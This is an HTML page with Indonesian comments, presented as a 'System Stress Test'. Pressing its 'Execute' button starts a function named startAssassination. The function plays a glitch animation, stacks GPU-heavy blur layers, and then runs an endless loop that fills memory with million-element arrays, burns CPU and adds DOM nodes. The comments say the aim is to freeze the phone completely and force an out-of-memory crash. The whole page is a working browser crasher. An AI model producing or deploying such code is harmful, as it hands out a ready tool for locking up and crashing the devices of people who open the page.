<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Void - System Stress Test</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        /* Desain Minimalis, Elegan, dan Bersih */
        :root {
            --bg: #030303;
            --text: #ffffff;
            --accent: #ff2a2a;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
            user-select: none;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            height: 100vh;
            width: 100vw;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            transition: background-color 0.8s ease;
        }

        .container {
            text-align: center;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Tipografi Elegan */
        h1 {
            font-weight: 300;
            letter-spacing: 12px;
            font-size: 1.2rem;
            color: #888;
            text-transform: uppercase;
            margin-bottom: 3rem;
            transition: 0.3s;
        }

        /* Tombol Eksekusi Minimalis */
        .btn-kill {
            background: transparent;
            color: var(--text);
            border: 1px solid #333;
            padding: 18px 50px;
            font-size: 0.9rem;
            letter-spacing: 6px;
            text-transform: uppercase;
            border-radius: 2px;
            cursor: pointer;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }

        .btn-kill::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: var(--accent);
            z-index: -1;
            transform: scaleX(0);
            transform-origin: right;
            transition: transform 0.4s ease;
        }

        .btn-kill:hover {
            border-color: var(--accent);
            box-shadow: 0 0 30px rgba(255, 42, 42, 0.2);
        }

        .btn-kill:hover::before {
            transform: scaleX(1);
            transform-origin: left;
        }

        .status {
            margin-top: 2rem;
            font-size: 0.7rem;
            letter-spacing: 3px;
            color: #444;
        }

        /* Mode Kematian (Death Sequence) */
        body.death-sequence {
            background-color: #0a0000;
            animation: glitch-bg 0.1s infinite;
        }

        body.death-sequence h1 {
            color: var(--accent);
            letter-spacing: 15px;
            font-weight: 700;
        }

        body.death-sequence .btn-kill {
            opacity: 0;
            pointer-events: none;
        }

        /* Efek Glitch Visual GPU Stress */
        .gpu-killer {
            position: absolute;
            width: 100vw;
            height: 50vh;
            background: rgba(255, 0, 0, 0.1);
            backdrop-filter: blur(20px) contrast(200%); /* Efek paling berat untuk GPU Mobile */
            mix-blend-mode: overlay;
            z-index: 5;
            pointer-events: none;
        }

        @keyframes glitch-bg {
            0% { filter: invert(0) hue-rotate(0deg); }
            50% { filter: invert(1) hue-rotate(90deg); transform: translate(2px, -2px); }
            100% { filter: invert(0) hue-rotate(0deg); }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1 id="title">System Integrity 100%</h1>
        <button class="btn-kill" id="executeBtn" onclick="startAssassination()">Execute</button>
        <div class="status" id="status-text">DEVICE STATUS: OPTIMAL</div>
    </div>

    <script>
        let isDead = false;
        let memoryBlackhole = []; // Array penampung RAM leak

        function startAssassination() {
            if (isDead) return;
            isDead = true;

            // 1. Ubah UI menjadi mengerikan secara instan
            document.body.classList.add('death-sequence');
            document.getElementById('title').innerText = "FATAL SEQUENCE";
            document.getElementById('status-text').innerText = "MEMORY CORRUPTION INITIATED...";
            document.getElementById('status-text').style.color = "#ff2a2a";

            // 2. Suntik elemen perusak GPU ke layar
            for (let i = 0; i < 50; i++) {
                let gpuStress = document.createElement('div');
                gpuStress.className = 'gpu-killer';
                gpuStress.style.top = (Math.random() * 100) + 'vh';
                gpuStress.style.transform = `rotate(${Math.random() * 360}deg)`;
                document.body.appendChild(gpuStress);
            }

            // Beri jeda 800 milidetik agar user melihat perubahan layar merah,
            // setelah itu eksekusi sistem secara brutal.
            setTimeout(() => {
                
                // INI ADALAH KODE PEMBUNUHNYA
                // While loop (tanpa henti) akan mengunci total HP, layar tidak akan bisa disentuh.
                // Di dalam loop, kita menimbun array jutaan angka ke dalam RAM.
                
                while (true) {
                    try {
                        // RAM OVERLOAD: Membuat array isi 1 juta data random terus menerus
                        // Ini akan membuat RAM Android penuh dalam hitungan 1-3 detik.
                        memoryBlackhole.push(new Array(1000000).fill(Math.random()));
                        
                        // CPU BURN: Memaksa CPU menghitung angka berat bersamaan
                        Math.sqrt(Math.random() * 999999) * Math.tan(Math.random());
                        
                        // GPU OVERLOAD: Menambah elemen DOM tiada henti
                        let div = document.createElement('div');
                        document.body.appendChild(div);

                    } catch (e) {
                        // Jika masuk kesini berarti RAM sudah jebol (Out of Memory)
                        // OS Android akan langsung melakukan Force Close.
                    }
                }
                
            }, 800);
        }
    </script>
</body>
</html>
